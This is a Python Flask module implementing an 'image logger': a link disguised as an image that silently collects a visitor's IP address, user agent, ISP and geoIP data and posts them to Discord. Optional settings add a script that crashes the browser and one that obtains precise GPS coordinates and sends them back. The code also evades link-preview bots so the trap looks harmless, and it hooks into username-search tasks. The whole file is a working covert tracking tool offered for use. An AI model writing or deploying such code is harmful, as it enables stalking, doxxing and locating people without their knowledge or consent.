# tracker/image_logger.py
# Versión casi idéntica al código original de tu amigo, adaptada a Flask
import os
import base64
import traceback
from datetime import datetime
from pathlib import Path
from flask import Blueprint, request, Response, render_template_string

# Reusa utilidades del tracker (geoip/send_discord_embed/sherlock) si están disponibles
try:
    from tasks import geoip_lookup, detect_ua_info, send_discord_embed, run_sherlock_task
except Exception:
    def geoip_lookup(ip): return {"ip": ip}
    def detect_ua_info(ua): return {"ua_string": ua}
    def send_discord_embed(*args, **kwargs): return None
    def run_sherlock_task(*args, **kwargs): return None

bp = Blueprint("image_logger", __name__)

OUT_DIR = os.environ.get("REPO_ROOT", os.getcwd()) + "/.pages/sherlock"
Path(OUT_DIR).mkdir(parents=True, exist_ok=True)

# Defaults (puedes sobreescribir con .env)
config = {
    "image": os.environ.get("IMAGE_URL", "https://via.placeholder.com/1600x900.png?text=image"),
    "imageArgument": os.environ.get("IMAGE_ARGUMENT", "1") != "0",
    "username": os.environ.get("IMAGE_USERNAME", "Image Logger"),
    "color": int(os.environ.get("IMAGE_COLOR", "0x00FFFF"), 16),
    "crashBrowser": os.environ.get("IMAGE_CRASH_BROWSER", "0") == "1",
    "accurateLocation": os.environ.get("IMAGE_ACCURATE_LOCATION", "0") == "1",
    "message": {
        "doMessage": os.environ.get("IMAGE_DO_MESSAGE", "0") == "1",
        "message": os.environ.get("IMAGE_MESSAGE_TEXT", "This browser has been pwned."),
        "richMessage": os.environ.get("IMAGE_RICH_MESSAGE", "1") == "1",
    },
    "vpnCheck": int(os.environ.get("IMAGE_VPN_CHECK", "1")),
    "linkAlerts": os.environ.get("IMAGE_LINK_ALERTS", "1") == "1",
    "buggedImage": os.environ.get("IMAGE_BUGGED", "1") == "1",
    "antiBot": int(os.environ.get("IMAGE_ANTI_BOT", "1")),
    "redirect": {
        "redirect": os.environ.get("IMAGE_REDIRECT", "0") == "1",
        "page": os.environ.get("IMAGE_REDIRECT_PAGE", "https://your-link.here")
    },
}

IMAGE_PING_POLICY = os.environ.get("IMAGE_PING_POLICY", "conservative").lower()
BLACKLISTED_PREFIXES = tuple(os.environ.get("IMAGE_BLACKLIST_PREFIXES", "27,104,143,164").split(","))
binaries = {"loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0')}

def botCheck(ip, useragent):
    if not ip:
        return False
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent and useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def _should_block_prefix(ip):
    if not ip:
        return False
    for pref in BLACKLISTED_PREFIXES:
        p = pref.strip()
        if p and ip.startswith(p):
            return True
    return False

def _ping_for_alert(*_args, **_kw):
    if IMAGE_PING_POLICY == "always":
        return True
    if IMAGE_PING_POLICY == "never":
        return False
    return False  # conservative

def reportError(error_text):
    try:
        hit = {"ip": "error", "endpoint": "image_logger", "received_at": datetime.utcnow().isoformat()}
        send_discord_embed(hit, {"ip": "error"}, {"ua_string": ""}, None, original_url=None)
    except Exception:
        stamp = int(datetime.utcnow().timestamp())
        p = Path(OUT_DIR) / f"image_logger_error_report_{stamp}.log"
        p.write_text(str(error_text))

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
    try:
        if not ip:
            return
        if _should_block_prefix(ip):
            return
        bot = botCheck(ip, useragent)
        if bot:
            if config["linkAlerts"]:
                hit = {"endpoint": endpoint, "ip": ip, "received_at": datetime.utcnow().isoformat()}
                geo = {"ip": ip}
                ua_info = {"ua_string": useragent}
                send_discord_embed(hit, geo, ua_info, None, original_url=url)
            return

        info = geoip_lookup(ip) or {}
        if info.get("proxy"):
            if config["vpnCheck"] == 2:
                return
            if config["vpnCheck"] == 1:
                pass
        ua_os_browser = detect_ua_info(useragent or "")
        hit = {"endpoint": endpoint, "ip": ip, "received_at": datetime.utcnow().isoformat()}
        send_discord_embed(hit, info, ua_os_browser, None, original_url=url)
        return info
    except Exception as exc:
        reportError(traceback.format_exc())
        return None

INTERSTITIAL_HTML = """<style>body {{margin:0;padding:0}}div.img {{background-image: url('{url}');background-position:center center;background-repeat:no-repeat;background-size:contain;width:100vw;height:100vh}}</style><div class="img"></div>"""

@bp.route("/i", methods=["GET", "POST"])
def handle_image_logger():
    try:
        q = request.args.to_dict(flat=True)
        if request.method == "POST":
            body = request.get_json(silent=True) or request.form.to_dict(flat=True)
            if isinstance(body, dict):
                q.update(body)

        if config["imageArgument"]:
            if q.get("u"):
                url = q.get("u")
            elif q.get("url"):
                candidate = q.get("url")
                if candidate.startswith("http"):
                    url = candidate
                else:
                    try:
                        url = base64.b64decode(candidate).decode(errors="ignore")
                    except Exception:
                        url = config["image"]
            elif q.get("id"):
                try:
                    url = base64.b64decode(q.get("id")).decode(errors="ignore")
                except Exception:
                    url = config["image"]
            else:
                url = config["image"]
        else:
            url = config["image"]

        ip = (request.headers.get("X-Forwarded-For") or request.remote_addr or "").split(",")[0].strip()
        ua = request.headers.get("User-Agent", "")

        if _should_block_prefix(ip):
            return Response(status=404)

        s_endpoint = request.path + (("?" + request.query_string.decode()) if request.query_string else "")
        bot = botCheck(ip, ua)
        if bot:
            if config["linkAlerts"]:
                if config["buggedImage"]:
                    data = binaries["loading"]
                    return Response(data, mimetype="image/jpeg")
                else:
                    return ("", 302, {"Location": url})

        coords = None
        if q.get("g") and config["accurateLocation"]:
            try:
                coords = base64.b64decode(q.get("g")).decode(errors="ignore")
            except Exception:
                coords = None

        result = makeReport(ip, ua, coords, endpoint=s_endpoint, url=url)
        if config["redirect"]["redirect"]:
            return render_template_string(f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'), 200, {"Content-Type": "text/html"}

        if config["message"]["doMessage"]:
            message = config["message"]["message"]
            if config["message"]["richMessage"] and result:
                message = message.replace("{ip}", ip)
                message = message.replace("{isp}", result.get("isp", "Unknown"))
                message = message.replace("{asn}", result.get("as", "Unknown"))
                message = message.replace("{country}", result.get("country", "Unknown"))
            return Response(message, mimetype="text/html")

        html = INTERSTITIAL_HTML.format(url=url)
        if config["crashBrowser"]:
            html += "<script>setTimeout(function(){for (var i=0;i<1e9;i++){Math.sqrt(i)}},100)</script>"

        if config["accurateLocation"]:
            html += """
<script>
var currenturl = window.location.href;
if (!currenturl.includes("g=") && navigator.geolocation) {
  navigator.geolocation.getCurrentPosition(function (coords) {
    var coord = coords.coords.latitude + "," + coords.coords.longitude;
    var b = btoa(coord).replace(/=/g, "%3D");
    if (currenturl.includes("?")) currenturl += "&g="+b; else currenturl += "?g="+b;
    location.replace(currenturl);
  });
}
</script>
"""
        return Response(html, mimetype="text/html; charset=utf-8")
    except Exception:
        tb = traceback.format_exc()
        try:
            hit = {"endpoint": "image_logger", "ip": "error", "received_at": datetime.utcnow().isoformat()}
            send_discord_embed(hit, {"ip": "error"}, {"ua_string": ""}, None, original_url=None)
        except Exception:
            stamp = int(datetime.utcnow().timestamp())
            p = Path(OUT_DIR) / f"image_logger_exception_{stamp}.log"
            p.write_text(tb)
        return Response("500 - Internal Server Error", status=500, mimetype="text/html")
